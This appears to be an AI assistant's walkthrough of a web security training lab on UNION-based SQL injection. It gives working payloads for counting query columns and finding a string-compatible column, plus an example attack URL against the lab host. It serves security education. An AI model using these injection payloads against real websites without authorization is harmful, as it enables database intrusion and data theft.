Perfect! This is a **practical lab exercise** that tests exactly what we just discussed. Let me walk you through how to solve it.

## Lab Goal

Make the random value (e.g., `'P2bvJ8'`) appear in the query results by placing it in a column that accepts strings.

## Step-by-Step Solution

### Step 1: Find the number of columns

Test different numbers of NULLs until you get no error:

```
'+UNION+SELECT+NULL--              (try this first)
'+UNION+SELECT+NULL,NULL--         (if error, try 2)
'+UNION+SELECT+NULL,NULL,NULL--    (if error, try 3)
```

**Expected result:** 3 columns works (no error)

### Step 2: Find which column accepts strings

Test each column one at a time with the random value (e.g., `'P2bvJ8'`):

**Test column 1:**
```
'+UNION+SELECT+'P2bvJ8',NULL,NULL--
```

**Test column 2:**
```
'+UNION+SELECT+NULL,'P2bvJ8',NULL--
```

**Test column 3:**
```
'+UNION+SELECT+NULL,NULL,'P2bvJ8'--
```

### Step 3: Identify success

When you see the random value appear in the response (usually in an unexpected place like a product name or price field), you've found a string-compatible column.

## Example URL

```
https://lab-id.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'P2bvJ8',NULL--
```

## What You'll See

If column 2 accepts strings, the lab page will show `P2bvJ8` somewhere in the results (perhaps as a product name or in a hidden row).

## One Sentence Summary

Test each NULL position with the random value – the one that makes it appear in the response is your string column.